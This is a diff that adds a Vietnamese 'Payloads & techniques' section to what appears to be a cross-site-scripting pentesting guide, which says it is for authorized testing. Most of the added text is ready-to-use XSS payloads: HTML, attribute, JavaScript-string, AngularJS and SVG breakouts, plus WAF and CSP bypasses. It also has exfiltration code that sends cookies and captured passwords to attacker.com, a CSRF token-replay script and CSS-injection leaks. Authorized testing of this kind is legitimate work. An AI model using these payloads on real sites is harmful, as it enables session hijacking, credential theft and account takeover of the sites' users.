@@ -39,6 +39,150 @@ Xác định ngữ cảnh phản chiếu, thoát khỏi ngữ cảnh đó, rồi
 thế. Dùng PoC vô hại `alert(document.domain)`; chỉ leo thang sang đánh cắp phiên trong phạm vi cho
 phép. Payload đầy đủ nằm trong tài liệu chuyên sâu.
 
+## Payload & kỹ thuật (Payloads & techniques)
+> Chắt lọc từ các tài liệu payload thực chiến — chỉ dùng cho kiểm thử được cấp phép.
+
+### Phát hiện ngữ cảnh (Context detection)
+Tiêm `"><'`+"`"+`${` và quan sát ký tự nào bị trả về dưới dạng đã mã hóa — điều này cho biết ngữ
+cảnh và cách thoát (breakout) bạn cần.
+
+| Ngữ cảnh | Hành vi | Cách thoát |
+|---------|----------|----------|
+| Thân HTML | `<` `>` bị mã hóa | tiêm thẻ |
+| Thuộc tính HTML (có dấu nháy) | `"`/`'` bị mã hóa | đóng dấu nháy rồi `on…=` |
+| Chuỗi JS | `\` `'` `"` bị escape | `'-alert(1)-'` / `';alert(1)//` |
+| Template literal JS | `${` không bị escape | `${alert(1)}` |
+| Tham số URL | trình duyệt mã hóa | URI `javascript:` |
+
+### Thân HTML / reflected / stored (HTML body / reflected / stored)
+```html
+<svg onload=alert(1)>
+<body onload=alert(1)>
+<details open ontoggle=alert(1)>
+<marquee onstart=alert(1)>
+<video><source onerror="alert(1)">
+<audio src=x onerror=alert(1)>
+<embed src=x onerror=alert(1)>
+<object data=x onerror=alert(1)>
+<input onfocus=alert(1) autofocus>
+<select onfocus=alert(1) autofocus>
+<textarea onfocus=alert(1) autofocus>
+<keygen onfocus=alert(1) autofocus>
+```
+
+### Ngữ cảnh thuộc tính (Attribute context)
+```html
+" onmouseover="alert(1)
+" onfocus="alert(1)" autofocus="
+" onclick="alert(1)">
+```
+Thuộc tính không có dấu nháy cho phép bạn thêm handler chỉ với khoảng trắng: `onmouseover=alert(1)`.
+
+### Ngữ cảnh chuỗi JavaScript (JavaScript-string context)
+```javascript
+'-alert(1)-'          // single-quoted string
+';alert(1)//          // statement terminate
+\';alert(1)//         // backslash escapes the app's escaping
+</script><script>alert(1)</script>   // terminate the script element entirely
+\"-alert(1)}//        // JSON/eval breakout
+```
+
+### AngularJS / tiêm template (AngularJS / template injection)
+```html
+{{constructor.constructor('alert(1)')()}}
+{{a=alert(1)}}
+<input id=x ng-focus=$event.composedPath()|orderBy:'(z=alert)(document.cookie)'>#x
+<body onresize="alert(document.cookie)">
+```
+Phát động `onresize` qua một iframe tự co giãn:
+```html
+<iframe src="https://victim.com/?search=<body onresize=print()>" onload="this.style.width='10px'"></iframe>
+```
+
+### Vector SVG (SVG vectors)
+```html
+<svg><animate onbegin=alert(1) attributeName=x></animate></svg>
+<svg><animatetransform onbegin=alert(1) attributeName=transform></animatetransform></svg>
+<svg><a><animate attributeName=href values="javascript:alert(1)"/><text y=20>click</text></a></svg>
+<svg><set attributeName=href to="javascript:alert(1)">
+```
+
+### Vượt WAF / bộ lọc (WAF / filter bypass)
+- **Phần tử tùy chỉnh (custom element)** khi các thẻ chuẩn bị chặn: `<xss id=x onfocus=alert(1) tabindex=1>#x</xss>`
+- **Sự kiện SMIL/animation**: `onbegin onend onrepeat onfocusin onfocusout`
+- **Accesskey** (kích hoạt khi Alt+Shift+X): `%27accesskey=%27x%27onclick=%27alert(1)`
+- **Mẹo mã hóa/khoảng trắng** giữa tên thuộc tính và `=`:
+```html
+<img src=x onerror%00=alert(1)>
+<img src=x onerror&#10;=alert(1)>
+<ScRiPt>alert(1)</ScRiPt>
+<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>
+```
+- **Thoát noscript** trong ngữ cảnh thuộc tính:
+```html
+<noscript><p title="</noscript><img src=x onerror=alert(1)>">
+```
+
+### Vượt CSP (CSP bypass)
+```html
+<img src='https://attacker.com/log?data=        <!-- dangling markup, captures markup to next quote -->
+<script nonce=ABC123>alert(1)</script>           <!-- reuse a leaked/predictable nonce -->
+```
+`unsafe-eval` hoặc `script-src` cùng origin cho phép `<script>alert(1)</script>` thuần đi qua.
+
+### Mutation XSS (mXSS)
+```html
+<svg><p><style><!--</style></p><img src=x onerror=alert(1)></p>
+```
+
+### postMessage XSS
+```javascript
+parent.postMessage('<img src=x onerror=alert(1)>', '*');   // when receiver writes data to a sink
+```
+
+### Tải lên file (SVG / HTML) (File upload (SVG / HTML))
+```html
+<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)">
+  <script>alert(document.cookie)</script>
+</svg>
+```
+
+### Trích xuất & leo thang (Exfiltration & escalation)
+```javascript
+fetch("https://attacker.com/steal?c=" + document.cookie);   // cookie theft
+```
+```html
+<!-- credential capture: fake password field -->
+<input name="username" id="username">
+<input type="password" onchange="fetch('https://attacker.com/steal',{method:'POST',body:username.value+':'+this.value})">
+```
+```javascript
+// CSRF via XSS: read the token from one page, replay the protected action
+fetch("/email/change-email").then(r=>r.text()).then(html=>{
+  var t=html.match(/csrf[^>]+value="([^"]+)"/)[1];
+  fetch("/email/change-email",{method:"POST",body:"email=attacker@evil.com&csrf="+t});
+});
+```
+```css
+/* CSS-injection exfil: leak a value character-by-character */
+input[value^="a"]{background:url("https://attacker.com/?c=a")}
+input[value^="b"]{background:url("https://attacker.com/?c=b")}
+```
+
+### Hướng dẫn lựa chọn (Selection guide)
+| Tình huống | Payload |
+|-----------|---------|
+| Không có bộ lọc | `<script>alert(1)</script>` |
+| `<script>` bị chặn | `<img src=x onerror=alert(1)>` |
+| `<img>` bị chặn | `<svg onload=alert(1)>` |
+| Event handler bị chặn | `<a href="javascript:alert(1)">click</a>` |
+| `href` bị chặn | `<svg><animate onbegin=alert(1)>` |
+| Tất cả thẻ chuẩn bị chặn | `<xss onfocus=alert(1) tabindex=1>#x</xss>` |
+| Trang AngularJS | `{{constructor.constructor('alert(1)')()}}` |
+| Ngữ cảnh chuỗi JS | `'-alert(1)-'` |
+| Template literal | `${alert(1)}` |
+| CSP chặn script | dangling-markup `<img>` |
+
 ## Phòng chống (Defenses)
 1. **Mã hóa đầu ra theo ngữ cảnh** (HTML, thuộc tính, JS, URL) — giải pháp chính.
 2. **Content-Security-Policy** chặt chẽ làm lớp phòng thủ bổ sung (`script-src` dùng nonce/hash).
